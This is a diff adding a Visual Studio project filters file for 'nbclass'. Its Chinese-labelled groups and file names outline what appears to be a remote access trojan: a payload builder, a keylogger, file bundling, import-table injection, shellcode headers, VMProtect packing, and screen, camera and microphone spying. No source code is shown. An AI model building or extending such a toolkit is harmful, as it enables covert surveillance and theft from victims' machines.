@@ -1,0 +1,572 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="源文件">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="头文件">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="资源文件">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="配置">
+      <UniqueIdentifier>{f67823a5-d264-4d17-b802-bd510672d612}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="地址位置">
+      <UniqueIdentifier>{72410ac7-57b5-45bc-844a-c4c282b9649f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="IOCP">
+      <UniqueIdentifier>{36385eb8-6942-4e8c-9bc2-231e6e786ce2}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="设置对话框">
+      <UniqueIdentifier>{28793862-3ab9-49a1-95a7-f85bab33ba38}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="服务管理">
+      <UniqueIdentifier>{a9c934aa-dc74-4a89-95d2-2400bd6d33b5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="备注">
+      <UniqueIdentifier>{7aab4c8c-805e-4e69-9b4d-6d9bf50373c1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="注册表">
+      <UniqueIdentifier>{aa5ebe55-a186-490c-a7e8-919c474155f8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="APP">
+      <UniqueIdentifier>{3261df67-efc4-4253-bd40-22fb3e6a67a8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="文件管理">
+      <UniqueIdentifier>{ebf3e3cc-9316-440e-9d6a-51ee7de6e298}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="屏幕控制">
+      <UniqueIdentifier>{a3be38ed-153e-43f4-98cc-4279dd723772}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="扬声器">
+      <UniqueIdentifier>{846d4aab-bba1-4c12-be17-e90190d8abdf}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="麦克风">
+      <UniqueIdentifier>{75bb9e09-1483-40ee-b3c5-e6d1a4fcf08f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="摄像头">
+      <UniqueIdentifier>{e1192609-096f-435d-836c-ab582f8c577e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="主机管理">
+      <UniqueIdentifier>{d0f19151-bf0a-4f69-8a99-ee57dbfbd009}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="计划任务">
+      <UniqueIdentifier>{58d78c55-0f39-4827-9831-0048c2f6d9cb}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="shellcode">
+      <UniqueIdentifier>{1f413c45-ce3a-4d3a-b9b7-1757822402b5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="生成小马">
+      <UniqueIdentifier>{eb7501ac-9fd2-48b2-92e9-cc03641ee74d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="键盘记录">
+      <UniqueIdentifier>{06f19686-d6fa-4346-8ccd-9ee6472c26e9}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="文件捆绑">
+      <UniqueIdentifier>{ef825aac-7b1b-4da4-926e-b988d7270888}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="虚拟桌面">
+      <UniqueIdentifier>{f759aadd-b344-47d6-b589-511aad88e355}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="实用功能">
+      <UniqueIdentifier>{de8ff995-7f83-4645-9f52-5eb4cea7a417}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="常用命令">
+      <UniqueIdentifier>{8cd37906-daa3-45e4-a251-f715b6c70723}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="shell">
+      <UniqueIdentifier>{64b88a63-bb49-489d-ae4e-2ef463ff8c77}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="列表排序专用">
+      <UniqueIdentifier>{2ec50cc4-8f72-468b-8454-770cf8e43e10}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="导入表注入">
+      <UniqueIdentifier>{1a3a4768-67d2-4485-a908-132632651162}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="系统管理">
+      <UniqueIdentifier>{1657960b-0991-4f1b-865e-45d7216312f1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="检测">
+      <UniqueIdentifier>{35acf418-8263-4449-9f8b-0bfbbdbaa68a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="vmp">
+      <UniqueIdentifier>{8a08f8c0-cea7-4ac3-a5bf-9c416d744f23}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="验证窗口">
+      <UniqueIdentifier>{47f61b02-db02-40cb-b452-5c9e2aab766f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="旧屏幕">
+      <UniqueIdentifier>{97481394-e994-4ff6-a363-77663cf3d2a9}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="nbclassDlg.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="framework.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="targetver.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="Resource.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="pch.h">
+      <Filter>头文件</Filter>
+    </ClInclude>
+    <ClInclude Include="IniFile.h">
+      <Filter>配置</Filter>
+    </ClInclude>
+    <ClInclude Include="SEU_QQwry.h">
+      <Filter>地址位置</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\common\zlib\zconf.h">
+      <Filter>IOCP</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\common\zlib\zlib.h">
+      <Filter>IOCP</Filter>
+    </ClInclude>
+    <ClInclude Include="Buffer.h">
+      <Filter>IOCP</Filter>
+    </ClInclude>
+    <ClInclude Include="CpuUsage.h">
+      <Filter>IOCP</Filter>
+    </ClInclude>
+    <ClInclude Include="IOCPServer.h">
+      <Filter>IOCP</Filter>
+    </ClInclude>
+    <ClInclude Include="Mapper.h">
+      <Filter>IOCP</Filter>
+    </ClInclude>
+    <ClInclude Include="CSetingDlg.h">
+      <Filter>设置对话框</Filter>
+    </ClInclude>
+    <ClInclude Include="CSystemDlg.h">
+      <Filter>系统管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CServerManager.h">
+      <Filter>服务管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CSerValue.h">
+      <Filter>服务管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CCreateServerDlg.h">
+      <Filter>服务管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CBzDlg.h">
+      <Filter>备注</Filter>
+    </ClInclude>
+    <ClInclude Include="CRegDlg.h">
+      <Filter>注册表</Filter>
+    </ClInclude>
+    <ClInclude Include="nbclass.h">
+      <Filter>APP</Filter>
+    </ClInclude>
+    <ClInclude Include="CRegDataDlg.h">
+      <Filter>注册表</Filter>
+    </ClInclude>
+    <ClInclude Include="CFileDlg.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="TrueColorToolBar.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="InputDlg.h">
+      <Filter>文件管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CScreenSpyDlg.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\libjpeg\jconfig.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\libjpeg\jerror.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\libjpeg\jmorecfg.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\libjpeg\jpeglib.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\libjpeg\turbojpeg.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="BmpToAvi.h">
+      <Filter>屏幕控制</Filter>
+    </ClInclude>
+    <ClInclude Include="CSpeakerDlg.h">
+      <Filter>扬声器</Filter>
+    </ClInclude>
+    <ClInclude Include="AudioRender.h">
+      <Filter>扬声器</Filter>
+    </ClInclude>
+    <ClInclude Include="PlaybackAudioCapture.h">
+      <Filter>扬声器</Filter>
+    </ClInclude>
+    <ClInclude Include="Audio.h">
+      <Filter>麦克风</Filter>
+    </ClInclude>
+    <ClInclude Include="CAudioDlg.h">
+      <Filter>麦克风</Filter>
+    </ClInclude>
+    <ClInclude Include="CVideoDlg.h">
+      <Filter>摄像头</Filter>
+    </ClInclude>
+    <ClInclude Include="CSysinfo.h">
+      <Filter>主机管理</Filter>
+    </ClInclude>
+    <ClInclude Include="CTaskDlg.h">
+      <Filter>计划任务</Filter>
+    </ClInclude>
+    <ClInclude Include="CCreateTaskDlg.h">
+      <Filter>计划任务</Filter>
+    </ClInclude>
+    <ClInclude Include="shellcode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\cmdcode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\filecode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\infocode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\logincode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\maikefeng.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\regcode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\servercode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\shipin.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\systemcode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\taskcode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\yangshengqi.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\pingmu.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="CGenerate.h">
+      <Filter>生成小马</Filter>
+    </ClInclude>
+    <ClInclude Include="CKeyboard.h">
+      <Filter>键盘记录</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\keycode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="CDesktopDlg.h">
+      <Filter>虚拟桌面</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\houtai.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="CTools.h">
+      <Filter>实用功能</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\toolscode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="CShowCommand.h">
+      <Filter>常用命令</Filter>
+    </ClInclude>
+    <ClInclude Include="CBundleDlg.h">
+      <Filter>文件捆绑</Filter>
+    </ClInclude>
+    <ClInclude Include="CShellDlg.h">
+      <Filter>shell</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\bhyy.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\bundle.H">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\bhyyshellcode.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\wx.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\WhiteFile.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="Sortthelist.h">
+      <Filter>列表排序专用</Filter>
+    </ClInclude>
+    <ClInclude Include="CInjection.h">
+      <Filter>导入表注入</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\powershell.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="check.h">
+      <Filter>检测</Filter>
+    </ClInclude>
+    <ClInclude Include="VMProtectSDK.h">
+      <Filter>vmp</Filter>
+    </ClInclude>
+    <ClInclude Include="CLOGIN.h">
+      <Filter>验证窗口</Filter>
+    </ClInclude>
+    <ClInclude Include="COLDSCREENSPY.h">
+      <Filter>旧屏幕</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\oldpingmu.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+    <ClInclude Include="..\shellcode\updata.h">
+      <Filter>shellcode</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="nbclassDlg.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="pch.cpp">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="IniFile.cpp">
+      <Filter>配置</Filter>
+    </ClCompile>
+    <ClCompile Include="SEU_QQwry.cpp">
+      <Filter>地址位置</Filter>
+    </ClCompile>
+    <ClCompile Include="Buffer.cpp">
+      <Filter>IOCP</Filter>
+    </ClCompile>
+    <ClCompile Include="CpuUsage.cpp">
+      <Filter>IOCP</Filter>
+    </ClCompile>
+    <ClCompile Include="IOCPServer.cpp">
+      <Filter>IOCP</Filter>
+    </ClCompile>
+    <ClCompile Include="CSetingDlg.cpp">
+      <Filter>设置对话框</Filter>
+    </ClCompile>
+    <ClCompile Include="CSystemDlg.cpp">
+      <Filter>系统管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CServerManager.cpp">
+      <Filter>服务管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CSerValue.cpp">
+      <Filter>服务管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CCreateServerDlg.cpp">
+      <Filter>服务管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CBzDlg.cpp">
+      <Filter>备注</Filter>
+    </ClCompile>
+    <ClCompile Include="CRegDlg.cpp">
+      <Filter>注册表</Filter>
+    </ClCompile>
+    <ClCompile Include="nbclass.cpp">
+      <Filter>APP</Filter>
+    </ClCompile>
+    <ClCompile Include="CRegDataDlg.cpp">
+      <Filter>注册表</Filter>
+    </ClCompile>
+    <ClCompile Include="CFileDlg.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="TrueColorToolBar.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="InputDlg.cpp">
+      <Filter>文件管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CScreenSpyDlg.cpp">
+      <Filter>屏幕控制</Filter>
+    </ClCompile>
+    <ClCompile Include="BmpToAvi.cpp">
+      <Filter>屏幕控制</Filter>
+    </ClCompile>
+    <ClCompile Include="CSpeakerDlg.cpp">
+      <Filter>扬声器</Filter>
+    </ClCompile>
+    <ClCompile Include="AudioRender.cpp">
+      <Filter>扬声器</Filter>
+    </ClCompile>
+    <ClCompile Include="PlaybackAudioCapture.cpp">
+      <Filter>扬声器</Filter>
+    </ClCompile>
+    <ClCompile Include="Audio.cpp">
+      <Filter>麦克风</Filter>
+    </ClCompile>
+    <ClCompile Include="CAudioDlg.cpp">
+      <Filter>麦克风</Filter>
+    </ClCompile>
+    <ClCompile Include="CVideoDlg.cpp">
+      <Filter>摄像头</Filter>
+    </ClCompile>
+    <ClCompile Include="CSysinfo.cpp">
+      <Filter>主机管理</Filter>
+    </ClCompile>
+    <ClCompile Include="CTaskDlg.cpp">
+      <Filter>计划任务</Filter>
+    </ClCompile>
+    <ClCompile Include="CCreateTaskDlg.cpp">
+      <Filter>计划任务</Filter>
+    </ClCompile>
+    <ClCompile Include="CGenerate.cpp">
+      <Filter>生成小马</Filter>
+    </ClCompile>
+    <ClCompile Include="CKeyboard.cpp">
+      <Filter>键盘记录</Filter>
+    </ClCompile>
+    <ClCompile Include="CDesktopDlg.cpp">
+      <Filter>虚拟桌面</Filter>
+    </ClCompile>
+    <ClCompile Include="CTools.cpp">
+      <Filter>实用功能</Filter>
+    </ClCompile>
+    <ClCompile Include="CShowCommand.cpp">
+      <Filter>常用命令</Filter>
+    </ClCompile>
+    <ClCompile Include="CBundleDlg.cpp">
+      <Filter>文件捆绑</Filter>
+    </ClCompile>
+    <ClCompile Include="CShellDlg.cpp">
+      <Filter>shell</Filter>
+    </ClCompile>
+    <ClCompile Include="Sortthelist.cpp">
+      <Filter>列表排序专用</Filter>
+    </ClCompile>
+    <ClCompile Include="CInjection.cpp">
+      <Filter>导入表注入</Filter>
+    </ClCompile>
+    <ClCompile Include="check.cpp">
+      <Filter>检测</Filter>
+    </ClCompile>
+    <ClCompile Include="CLOGIN.cpp">
+      <Filter>验证窗口</Filter>
+    </ClCompile>
+    <ClCompile Include="COLDSCREENSPY.cpp">
+      <Filter>旧屏幕</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="nbclass.rc">
+      <Filter>资源文件</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\nbclass.rc2">
+      <Filter>资源文件</Filter>
+    </None>
+    <None Include="res\dot.cur">
+      <Filter>资源文件</Filter>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="res\nbclass.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\cmdshell.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\sysinfo.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\regedit.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\dword.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\regsz.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\文件夹1.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\remote.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\File.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Bitmap_4.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\Bitmap_5.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\toolbar1.bmp">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\010.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\CPU.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\qq2.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\地球.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\防火墙.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\分辨率.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\路径.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\内存.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\时间.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\显卡.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\硬盘.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\语言.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\OS.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+    <Image Include="res\imgioc\远程.ico">
+      <Filter>资源文件</Filter>
+    </Image>
+  </ItemGroup>
+  <ItemGroup>
+    <Media Include="res\wav\login.wav">
+      <Filter>资源文件</Filter>
+    </Media>
+    <Media Include="res\wav\up.wav">
+      <Filter>资源文件</Filter>
+    </Media>
+  </ItemGroup>
+</Project>
